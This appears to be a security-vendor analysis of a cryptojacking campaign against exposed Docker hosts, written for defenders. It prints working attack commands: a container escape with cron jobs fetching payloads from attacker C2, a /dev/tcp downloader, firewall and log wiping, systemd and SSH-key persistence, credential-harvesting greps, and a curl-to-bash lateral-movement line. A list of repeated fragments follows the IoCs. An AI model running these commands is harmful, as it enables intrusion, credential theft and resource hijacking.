@@ -1,0 +1,550 @@
+
+Key points and observations
+
+We have identified a new cryptojacking campaign by the attackers behind Spinning YARN
+Like previous campaigns, the attackers target publicly exposed Docker Engine hosts for initial access.
+We discovered two novel binary payloads, along with new attacker infrastructure used throughout the campaign. The new payloads include:
+
+chkstart— a remote access tool that’s also capable of retrieving and dynamically executing payloads
+exeremo— a lateral movement tool, used to propagate the malware via SSH
+vurl (binary)— a Go port of the shell script downloader from the original campaign, used to retrieve malware from the attacker’s infrastructure
+
+chkstart— a remote access tool that’s also capable of retrieving and dynamically executing payloads
+exeremo— a lateral movement tool, used to propagate the malware via SSH
+vurl (binary)— a Go port of the shell script downloader from the original campaign, used to retrieve malware from the attacker’s infrastructure
+The attackers also use an unusual persistence mechanism by modifying existing systemd services and using the ExecStartPost configuration option to execute malicious commands.
+Attack Flow
+Analysis of the attack
+Datadog Security Researchers recently encountered a new campaign that targets Docker API endpoints publicly exposed without authentication, with the objective of spreading cryptojacking malware. The observed tactics, techniques, and procedures (TTPs) bear resemblance to those seen in Spinning YARN, another campaign discovered in March 2024 by Cado Security. Based on analysis of the two campaigns and the infrastructure underpinning them, we have made a high-confidence assessment that these campaigns are linked.
+Spinning YARN and similar campaigns are often difficult to differentiate based on telemetry alone. The attackers have a tendency to reuse names for payloads, even when the payloads themselves have been updated or completely replaced. This makes analysis of the individual payloads necessary to gain a comprehensive understanding of the campaign’s evolution.
+Initial Access
+The campaign begins with the threat actor scanning the internet to identify hosts with port 2375 (Docker’s default port) open. Once a valid host has been identified, exploitation begins with  some common Docker reconnaissance actions, namely querying the version of the Docker host before attempting to compromise it. The attackers achieve this by issuing the docker version command. This results in an HTTP GET request being sent to the /v1.16/version endpoint, and a subsequent response containing information about the server being returned to the attacker.
+This procedure tells the attacker that the Docker host is available and is responding to commands from the open internet. After this confirmation, the attacker proceeds to the exploitation phase by attempting to spawn an Alpine Linux container and utilizing the Binds parameter of the Docker’s host configuration to bind the root directory of the Docker host itself into the container.
+"Image": "alpine",
+"HostConfig": {
+  "Binds": ["/:/mnt"],
+Snippet of the command used to spawn an Alpine container and bind the host’s root directory (/) to a mount point within the container (/mnt)
+If this succeeds, the attacker escalates their privileges through accessing the underlying filesystem of the Docker host via the /mnt directory within the container.
+Along with defining the container image and host configuration parameters, the attacker issues a shell command (seen below) within the container itself. This command uses the Linux chroot shell utility to set the root of subsequent processes to the /mnt directory (within which the underlying file system is mounted).
+In the same command, a base64-encoded shell script is written out to /usr/bin/vurl and a cron job is saved to /etc/crontab and /etc/cron.d/zzh.  These jobs retrieve a second stage payload using the vurl executable (more on this below), and ensure it’s persistently executed.
+chroot /mnt/ /bin/sh -c echo dnVybCgpIHsKICAgIElGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw+Ii9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblVzZXItQWdlbnQ6IHp6aGJvdFxyXG5cclxuIiA+JjMKICAgICh3aGlsZSByZWFkIC1yIGw7IGRvIGVjaG8gPiYyICIkbCI7IFtbICRsID09ICQnXHInIF1dICYmIGJyZWFrOyBkb25lICYmIGNhdCApIDwmMwogICAgZXhlYyAzPiYtCn0KCnZ1cmwgIiRAIgo= |base64 -d >/usr/bin/vurl && chmod +x /usr/bin/vurl;echo '* * * * * root echo dnVybCBodHRwOi8vYi45LTktMTEuY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash' >/etc/crontab && echo '*/3 * * * * root echo dnVybCBodHRwOi8vYi45LTktMTEuY29tL2JyeXNqL2Iuc2gK|base64 -d|bash|bash' >/etc/cron.d/zzh
+Malicious shell commands run in the Alpine container
+To retrieve payloads throughout the campaign, the attacker deploys two downloader utilities, both of which are named vurl (likely inspired by curl). This section will discuss the first vurl payload. The second will be discussed in a later section.
+The first vurl payload is similar to the one found in the original Spinning YARN campaign, with one minor difference: the inclusion of a hardcoded user agent string (zzhbot). The payload consists of a shell script to connect to an attacker-controlled command and control (C2) server, via the /dev/tcp device file, and execute a HTTP GET request to retrieve additional executables from the server.
+If you attempt to retrieve a payload without specifying this user agent, the server will return a HTTP 404 (file not found) error. Requiring the zzhbot user agent is likely an attempt by the attacker to limit payload retrieval to hosts compromised by the malware.
+vurl() {
+    IFS=/ read -r proto x host query <<<"$1"
+    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\nUser-Agent: zzhbot\r\n\r\n" >&3
+    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
+    exec 3>&-
+}
+
+vurl "$@"
+Contents of vurl shell script payload
+Actions on objective
+After the attacker gains initial access and achieves execution via cron, the next stage of the campaign is to fetch and execute a new shell script—b.sh.
+This script contains a base64-encoded tar archive of a new binary named vurl. The script decodes and extracts this binary to /usr/bin/vurl, overwriting the existing shell script version, before fetching and executing one of two shell scripts—ar.sh or ai.sh.
+Consistent with binary payloads from the original campaign, this updated version of vurl is compiled from Go code and has much of the same functionality as its shell script equivalent—including the use of the zzhbot user agent string.
+This binary differs from the shell script version in its use of hardcoded C2 domains. When the vurl binary is called, a URL is passed to the binary as an argument. The domain in this URL is then rewritten to one of two attacker-controlled C2 domains: b.9-9-11[.]com or, if the former is unavailable, b.9-9-12[.]com.
+The vurl binary connects to the IP hosting the C2 domain via the connect() syscall and issues the same GET request used by the shell script. As before, the C2 server will only return a 200 status code and allow the download of a requested payload if the user agent is set to zzhbot.
+v13 = gethostbyname("b.9-9-11.com");
+  if ( v13 || (v13 = gethostbyname("b.9-9-12.com")) != 0LL )
+  {
+    fd = socket(2, 1, 0);
+    if ( fd >= 0 )
+    {
+      bzero(&s, 0x10uLL);
+      s.sa_family = 2;
+      bcopy(*(const void **)v13->h_addr_list, &s.sa_data[2], v13->h_length);
+      *(_WORD *)s.sa_data = htons(0x50u);
+      if ( connect(fd, &s, 0x10u) >= 0 )
+      {
+        v1 = strdup(v3);
+        v10 = strtok(v1, "/");
+        strtok(0LL, "/");
+        v9 = strtok(0LL, &byte_400E07);
+        sprintf(buf, "GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: zzhbot\r\n\r\n", v9, v13->h_name);
+        v2 = strlen(buf);
+        if ( send(fd, buf, v2, 0) >= 0 )
+        {
+          v12 = 0;
+          while ( 1 )
+          {
+            v8 = recv(fd, haystack, 0x400uLL, 0);
+            if ( v8 <= 0 )
+              break;
+            if ( v12 )
+            {
+              fwrite(haystack, 1uLL, v8, stdout);
+            }
+            else
+            {
+              v7 = strstr(haystack, "\r\n\r\n");
+              if ( v7 )
+              {
+                v12 = 1;
+                fwrite(v7 + 4, 1uLL, (char *)&v3 + 4 - v7 + v8, stdout);
+              }
+            }
+          }
+          close(fd);
+Decompiler output demonstrating vurl binary functionality
+With this updated vurl binary in place, the malware uses it to retrieve ar.sh if running under the root user, or ai.sh if running under a regular user. At the time of this writing, the ai.sh payload was no longer being served, making it likely that the attacker assumes the user will indeed be root.
+#!/bin/bash
+vb='<base64 string>'
+echo $vb|base64 -d >/tmp/vb.tar &&tar -xf /tmp/vb.tar -C /usr/bin/ && chmod +x /usr/bin/vurl
+
+if [ "$(id -u)" = "0" ];then 
+vurl  http://www.bing.com/brysj/d/ar.sh|bash
+else
+vurl http://www.google.com/brysj/d/ai.sh|bash
+fi
+Example contents of b.sh
+Note the usage of the bing.com and google.com domains as attempts to obfuscate payload delivery domains. These are rewritten to the attacker's C2 by the vurl binary, as described above.
+Despite attempting to obfuscate payload delivery domains using this URL rewriting technique, the attacker revealed at least one of their domains during the initial access stage. The malicious cron job used to fetch b.sh includes a base64-encoded URL, which of course is trivial to decode.
+At this point, the attacker uses the ar.sh payload to continue their actions on objective. This payload is similar to the previous version of Spinning YARN, and a summary of its functionality follows:
+
+Define a working directory of /var/tmp/.222 (to store additional payloads)
+Install various tools to perform code compilation and scan the internet
+Remove existing cron entries
+Weaken the system by disabling firewalls, clearing shell history, and preventing new lines from  being added to the history file
+Compile the open source process hider libprocesshider on delivery and registering it with the dynamic linker. This behaviour was also observed in our recent blog Analysis of a TeamTNT Doppelganger
+Remove monitoring agents associated with cloud service providers such as Tencent and Alibaba Cloud
+Clear various log files, including the syslog, messages, auth.log, boot.log, dmesg, etc
+Retrieve and execute the next payload, chkstart
+iptables -F
+systemctl stop firewalld 2>/dev/null 1>/dev/null
+systemctl disable firewalld 2>/dev/null 1>/dev/null
+service iptables stop 2>/dev/null 1>/dev/null
+ulimit -n 65535 2>/dev/null 1>/dev/null
+export LC_ALL=C 
+HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
+export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
+unset HISTFILE 2>/dev/null 1>/dev/null
+shopt -ou history 2>/dev/null 1>/dev/null
+set +o history 2>/dev/null 1>/dev/null
+HISTSIZE=0 2>/dev/null 1>/dev/null
+Excerpt of ar.sh demonstrating firewall disabling rules and clearing shell history
+As mentioned above, ar.sh retrieves and executes a new binary, named chkstart. This is another Go binary, acting as a tool to configure the host for remote access, persistently execute the primary payload, and download additional payloads to continue the execution chain. This binary is absent from public reporting on similar campaigns, suggesting that it’s a new tool the attacker is deploying.
+urls.array = "http://b.9-9-11.com/brysj/m/m.tar";
+urls.len = 33LL;
+urls.cap = "http://b.9-9-12.com/brysj/m/m.tar";
+v22 = 33LL;
+v23 = "http://b.9-9-13.com/brysj/m/m.tar";
+v24 = 33LL;
+fallback_urls.array = &urls;
+fallback_urls.len = 3LL;
+fallback_urls.cap = 3LL;
+user_agent.str = "zzhbot";
+user_agent.len = 6LL;
+output_path.str = "/var/tmp/.222";
+output_path.len = 13LL;
+v4 = main_downloadFile(fallback_urls, user_agent, output_path, 3LL);
+chkstart main function - defining an array of payload delivery URLs before a call to downloadFile
+In the original Spinning YARN campaign, much of chkstart’s functionality was handled by shell scripts. Porting this functionality over to Go code could suggest the attacker is attempting to complicate the analysis process, since static analysis of compiled code is significantly more difficult than shell scripts. It could also be an attempt to take advantage of certain Go features, including cross-compilation, native tests, and strong typing.
+Similar to the original Spinning YARN campaign, the developer neglected to strip the Go binaries after compilation—leaving DWARF debug information intact. This makes static analysis easier, as this information can help a researcher understand the binary’s purpose.
+chkstart’s main function begins with a check to determine whether a connection to one of the malicious domains below is currently active:
+m.9-9-8[.]com
+m.9-9-11[.]com
+m.9-9-12[.]com
+m.9-9-13[.]com
+m.9-9-14[.]com
+m.9-9-15[.]com
+m.9-9-16[.]com
+m.9-9-17[.]com
+m.9-9-18[.]com
+m.9-9-19[.]com
+The purpose of this check is to determine whether the host has already been compromised by the malware. If an established connection has already been made to one of the hardcoded m subdomains, chkstart will report this connection to stdout and exit the process.
+If the host hasn’t already been compromised, the malware proceeds to retrieve a tar archive of additional payloads to use for the next stage. It will then define a new array of URLs (depicted in the following bulleted list) and a user agent string of zzhbot and call another helper function named downloadFile.
+This downloadFile function is used to download the previously-mentioned tar archive, m.tar— containing additional payloads—from the new array of hardcoded URLs. Examples of these URLs can be seen below:
+
+http[://]b.9-9-11[.]com/brysj/m/m.tar
+http[://]b.9-9-12[.]com/brysj/m/m.tar
+http[://]b.9-9-13[.]com/brysj/m/m.tar
+If m.tar is available at one of these URLs, the archive is saved to a hardcoded path of /var/tmp/.222, the contents are extracted (more on this later), and the /var/tmp/.222 directory is made executable.
+Registering persistence
+After retrieving the archive of additional payloads, the chkstart binary proceeds to register persistence for a new binary named top.
+First, chkstart will list systemd unit files by issuing the command systemctl --type=service list-unit-files. The output of this command is then filtered to look for results with the string enabled, indicating that the service defined by the unit file is currently loaded and running.
+atd.service                            enabled         enabled
+auditd.service                         enabled         enabled
+auth-rpcgss-module.service             static          -
+autovt@.service                        alias           -
+cfn-hup.service                        disabled        disabled
+chrony-config.service                  enabled         enabled
+Example output of systemctl --type=service list-unit-files
+Of the resulting unit files, the malware locates the path to the file itself via the output of systemctl show -p FragmentPath <name of service>.
+The next stage is to use these file paths to search the contents of the unit files with grep and determine whether the directive ExecStart= is present. Systemd uses this directive to define a custom command to execute once the service is loaded. An example value would be a path to the binary you would like to run as a service.
+For unit files with the ExecStart= directive, systemd also allows you to define an additional command to be executed after the ExecStart= command completes. This is specified with the ExecStartPost= directive. The malware abuses this feature by inserting the line ExecStartPost=/var/tmp/.222/top into the unit file, resulting in the binary top being executed each time the service is loaded.
+On a vanilla Amazon Linux EC2 instance, the malware identified /usr/lib/systemd/system/amazon-ssm-agent.service and /usr/lib/systemd/system/atd.service as candidates to target for this modification.
+Example contents of a modified  amazon-ssm-agent.service can be seen below:
+[Unit]
+Description=amazon-ssm-agent
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/usr/bin/
+ExecStart=/usr/bin/amazon-ssm-agent
+ExecStartPost=/var/tmp/.222/top # line added by chkstart malware
+KillMode=process
+The attacker also uses chkstart to update the SSH daemon’s configuration, adding the following line:
+AuthorizedKeysFile .ssh/authorized_keys .ssh/.ssh/zzhkeys
+This ensures that public keys residing in .ssh/authorized_keys and .ssh/.ssh/zzhkeys can be used by the SSH server for authentication. The malware then proceeds to write an attacker-controlled key to /root/.ssh/authorized_keys and /root/.ssh/.ssh/zzhkeys.
+ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver
+Attacker-controlled SSH key
+Resource Hijacking
+At this stage, the attacker has achieved persistent execution of a binary (named top),and—assuming that SSH is running, is publicly accessible, and has public key authentication enabled—has backdoor access to the compromised host via SSH.
+Contrary to previous binary payloads, top is stripped, meaning the developer attempted to obfuscate its functionality. It’s also compiled from C++ code, rather than Go.
+Despite these differences, the binary itself is rather uninteresting. Analysis shows that it’s a custom build of the XMRig miner, with a hardcoded configuration baked into the binary itself. This reveals the objective of the campaign: hijacking the resources of the Docker host to mine the XMRig cryptocurrency.
+Details of the XMRig configuration extracted from top are included in the Indicators of compromise section below. Of note is the use of the m.9-9-11[.]com, m.9-9-12[.]com, m.9-9-13[.]com, and m.9-9-14[.]com domains as custom mining pools. This indicates that the attacker uses the b subdomain to host payloads and the m subdomain to host mining pools.
+Lateral Movement
+After taking steps to launch an XMRig miner on the compromised hosts, the attackers deploy a new payload, named exeremo, and leverage it to move laterally to additional hosts.
+exeremo is another example of malicious functionality previously seen in shell scripts being ported to Go code. This binary is yet another unreported payload from this updated campaign and attempts to do the following:
+
+Identify related SSH servers and spread the malware to them
+Add an infection marker to the host
+Execute an additional shell script payload (s.sh)
+exeremo includes several functions dedicated to extracting usernames, hosts, and private keys used in outbound SSH connections from the compromised server.
+The malware achieves this by issuing a series of inline shell commands from Go functions within the binary itself. These commands are summarised in the table below.
+
+Go Function	Purpose	Shell Command(s)
+getUsers	Extracts SSH usernames from shell history files	cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep "  @" |grep -vw " cp"  | grep -vw " mv"  | grep -vw " cd "  | grep -vw " nano"  | grep -v grep | grep -E " (ssh|scp)"   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq
+getUniqueHosts	Extracts SSH hosts from shell history, SSH config files, and known_hosts	cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F " HostName"  '{print $2}'
+		cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | grep -oP " ([0-9]{1,3}\.){3}[0-9]{1,3}"
+		cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | tr ':' ' ' | awk -F '@' '{print $2}' | awk '{print $1}
+		cat /etc/hosts | grep -vw " 0.0.0.0"  | grep -vw " 127.0.1.1"  | grep -vw " 127.0.0.1"  | sed -r '/\n/!s/[0-9.]+/\n&amp;\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}'
+		cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP " ([0-9]{1,3}\.){3}[0-9]{1,3}"  | uniq
+getKeyList	Extracts SSH keys from shell history and SSH config files	cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F " IdentityFile"  '{print $2 }'
+		cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | awk -F ' -i ' '{print $2}' | awk '{print $1}'
+getPortList	Searches shell history for evidence of SSH commands and extracts discovered usernames	echo " 22"  | cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw 'cp' | grep -vw 'mv' | grep -vw 'cd ' | grep -vw 'nano' | grep -v grep | grep -E '(ssh|scp)' | tr ':' ' ' | awk -F '-p' '{print $2}'
+		cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep " @" |grep -vw " cp"  | grep -vw " mv"  | grep -vw " cd "  | grep -vw " nano"  | grep -v grep | grep -E " (ssh|scp)"   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq
+The results of these commands are stored in memory and used to execute ar.sh on remote hosts via SSH remote command invocation. The SSH command used for this takes the following form:
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i %s %s@%s -p%s 'nohup $(curl -A %s -Ls %s | bash);
+To assist with identifying new Docker servers for exploitation, exeremo will retrieve another shell script payload named s.sh. This is read into memory and executed dynamically due to code from a function named executeScriptFromURL. Once again, this function leverages the zzhbot user agent string in the resulting HTTP request.
+s.sh: Stager for pnscan, masscan, and a custom Docker discovery utility
+s.sh contains similar code to the shell scripts seen in the original Spinning YARN campaign. It’s responsible for installing various scanning tools commonly used in cloud and Linux malware attacks, for example pnscan and masscan.
+The script also creates a directory at the path /etc/.httpd/…. and copies a binary named sd (extracted from m.tar and analysed below) into it, before renaming it as httpd. This naming convention is also used in the previous campaign and is likely an attempt to disguise the resulting process as the httpd HTTP server frequently found on Linux systems.
+With the sd binary renamed, a systemd service is created at the following path to persistently launch the binary at boot:
+/etc/systemd/system/zzhr.service
+The following systemctl commands are executed to achieve this:
+sudo systemctl enable zzhr.service
+sudo systemctl daemon-reload
+sudo systemctl start zzhr.service
+Additional payloads
+The following additional payloads were also discovered, but exhibit similar behaviors to samples from the original campaign, so aren’t considered novel. For this reason, we’ve summarized the functionality below.
+This 64-bit Go ELF binary resembles the Docker initial access tool (d.sh) reported by Cado Security in their original blog on Spinning YARN. The malware uses masscan to scan a randomised /8 network prefix for vulnerable Docker Engine hosts.
+Once these hosts have been identified, the malware uses zgrab to send the Docker reconnaissance commands described in the Initial Access section of this blog. If reconnaissance is successful, the malware will proceed to issue the previously described base64-encoded initial access command, kickstarting the infection on a new host.
+Another 64-bit Go ELF binary, this appears to be an updated version of the fkoths payload discovered by Cado. Nothing of significance has changed with this payload, its main purpose remains to remove any Docker images created by the malware during the Initial Access phase, essentially performing anti-forensics on the host. It will also update /etc/hosts/ to “blackhole” requests to the Docker registry by redirecting them to the loopback address.
+How Datadog can help
+Datadog Cloud Workload Security (CWS) comes with the following out-of-the-box runtime security rules, which enable you to detect the types of attacker activity discussed in this post:
+
+Docker daemon publicly accessible
+Compiler executed in container
+File created and executed inside container
+Suspected dynamic linker hijacking attempt
+Conclusion
+This update to the Spinning YARN campaign shows a willingness to continue attacking misconfigured Docker hosts for initial access. The threat actor behind this campaign continues to iterate on deployed payloads by porting functionality to Go, which could indicate an attempt to hinder the analysis process, or point to experimentation with multi-architecture builds. The campaign contains several detection opportunities, and the IoCs extracted from this analysis should help identify activity associated with this campaign in your environment.
+Lists of unused domains extracted from the payloads show that the campaign is very much active and is likely to continue for the foreseeable future. The attackers deployed resilient infrastructure, such as multiple C2 servers, mining pools, and additional payloads.
+Although the likely objective of this campaign is to deploy an XMRig miner to compromised hosts, the attackers also ensured that they maintain access to victim machines via SSH. Maintaining remote code execution to victim hosts could mean that attackers can leverage their access for additional objectives
+Indicators of Compromise
+
+Filepaths
+/usr/bin/vurl
+/etc/.../.ice-unix
+/etc/.httpd/...
+/etc/.httpd/.../httpd
+/etc/cron.d/zzh
+/etc/systemd/system/zzhr.service
+/var/tmp/.222
+/var/tmp/.222/m.tar
+/var/tmp/.222/1.0.4.tar.gz
+/var/tmp/.222/chkstart
+/var/tmp/.222/exeremo
+/var/tmp/.222/fkoths
+/var/tmp/.222/p.tar
+/var/tmp/.222/pnscan
+/var/tmp/.222/top
+/var/tmp/.222/zgrab
+/var/tmp/.dog
+/root/.ssh/.ssh/zzhkeys
+/tmp/m.service
+
+Domains/URLs
+m.9-9-8[.]com
+m.9-9-11[.]com
+m.9-9-12[.]com
+m.9-9-13[.]com
+m.9-9-14[.]com
+m.9-9-15[.]com
+m.9-9-16[.]com
+m.9-9-17[.]com
+m.9-9-18[.]com
+m.9-9-19[.]com
+b.9-9-11[.]com
+b.9-9-11[.]com/brysj/m/m.tar
+b.9-9-11[.]com/brysj/d/ar.sh
+b.9-9-11[.]com/brysj/d/ai.sh
+b.9-9-11[.]com/brysj/d/s.sh
+b.9-9-12[.]com
+
+IP Addresses
+64[.]19.222.131
+206[.]189.204.54
+107[.]189.7.84
+194[.]36.190.118
+
+Filename	SHA256
+1.0.4.tar.gz	51de345f677f46595fc3bd747bfb61bc9ff130adcbec48f3401f8057c8702af9
+ar.sh	12481d3fbcee0ed5aa8a9c8bc1aeb71bf9439cbddf68e8cd275c2a90b26ec0ad
+b.sh	852a577b227aa856399ae836d9db15eee38a4f62301a8590f80a009ec29dad8a
+chkstart	2063e682e631fc28d77b50b32494edf2cf37bcc1e85c6d0302b34fa2e30aa52f
+exeremo	048a1fe62bcd51cbf91128012dc1c15f25b17133d241c25d6717c3caf766c1ec
+fkoths	7044f839aecd91bc5e4deac327d0b41fdae9a8238a9b64510ff336e49ed92e08
+m.tar	0d508268b3f6d3b5396d5d182e546e59311af1d4ebe03a7728e2fd2a212c008b
+p.tar	b6ddd29b0f74c8cfbe429320e7f83427f8db67e829164b67b73ebbdcd75d162d
+s.sh	32dfb086e6719c20666f151d17a3fbfcbccf559d0a8f1b2b888175f1a4d8f8a8
+sd	f3925aad20636a17be343ff473e6acb86345bc82c6611daa2154e24cd5e670e8
+top	dcff5f9e748c915aeefce08991d924197aff7f2a0affda00bfb45cfa1919b641
+vurl	fdda14d3bc993960991ac6c95964514444e730f04b76d607df6e59087761648d
+zgrab	f53b8f70f6aeb478781e17ffd16a0fbbe5a5a08b4c4c0597091bc3407794ed1b
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": true,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "max-threads-hint": 50,
+        "asm": true,
+        "argon2-impl": null,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "log-file": null,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "m.9-9-11.com:8080",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "m.9-9-12.com:8080",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "m.9-9-13.com:8080",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        },
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "m.9-9-14.com:8080",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
+    "retries": 5,
+    "retry-pause": 5,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
+}
+
+chkstart— a remote access tool that’s also capable of retrieving and dynamically executing payloads
+exeremo— a lateral movement tool, used to propagate the malware via SSH
+vurl (binary)— a Go port of the shell script downloader from the original campaign, used to retrieve malware from the attacker’s infrastructure
+chkstart
+exeremo
+vurl
+ExecStartPost
+docker version
+HTTP GET
+Binds
+chroot
+vurl
+vurl
+vurl
+vurl
+zzhbot
+HTTP GET
+HTTP 404
+zzhbot
+b.sh
+vurl
+ar.sh
+ai.sh
+vurl
+zzhbot
+vurl
+vurl
+connect()
+GET
+zzhbot
+vurl
+ar.sh
+ai.sh
+ai.sh
+b.sh
+vurl
+b.sh
+ar.sh
+chkstart
+ar.sh
+ar.sh
+chkstart
+downloadFile
+chkstart
+chkstart
+chkstart
+zzhbot
+downloadFile
+downloadFile
+chkstart
+top
+chkstart
+systemctl --type=service list-unit-files
+enabled
+systemctl show -p FragmentPath <name of service>
+grep
+ExecStart=
+ExecStart=
+ExecStart=
+ExecStartPost=
+ExecStartPost=/var/tmp/.222/top
+top
+chkstart
+AuthorizedKeysFile .ssh/authorized_keys .ssh/.ssh/zzhkeys
+top
+top
+exeremo
+exeremo
+s.sh
+exeremo
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep "  @" |grep -vw " cp"  | grep -vw " mv"  | grep -vw " cd "  | grep -vw " nano"  | grep -v grep | grep -E " (ssh|scp)"   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq
+cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F " HostName"  '{print $2}'
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | grep -oP " ([0-9]{1,3}\.){3}[0-9]{1,3}"
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | tr ':' ' ' | awk -F '@' '{print $2}' | awk '{print $1}
+cat /etc/hosts | grep -vw " 0.0.0.0"  | grep -vw " 127.0.1.1"  | grep -vw " 127.0.0.1"  | sed -r '/\n/!s/[0-9.]+/\n&amp;\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}'
+cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP " ([0-9]{1,3}\.){3}[0-9]{1,3}"  | uniq
+cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F " IdentityFile"  '{print $2 }'
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E " (ssh|scp)"  | awk -F ' -i ' '{print $2}' | awk '{print $1}'
+echo " 22"  | cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw 'cp' | grep -vw 'mv' | grep -vw 'cd ' | grep -vw 'nano' | grep -v grep | grep -E '(ssh|scp)' | tr ':' ' ' | awk -F '-p' '{print $2}'
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep " @" |grep -vw " cp"  | grep -vw " mv"  | grep -vw " cd "  | grep -vw " nano"  | grep -v grep | grep -E " (ssh|scp)"   |tr ':' ' ' | awk -F '@' '{print $1}'|awk '{print $NF}'|sort -k1|uniq
+ar.sh
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i %s %s@%s -p%s 'nohup $(curl -A %s -Ls %s | bash);
+exeremo
+s.sh
+executeScriptFromURL
+zzhbot
+s.sh
+s.sh
+sd
+httpd
+httpd
+sd
+/etc/systemd/system/zzhr.service
+systemctl
+d.sh
+masscan
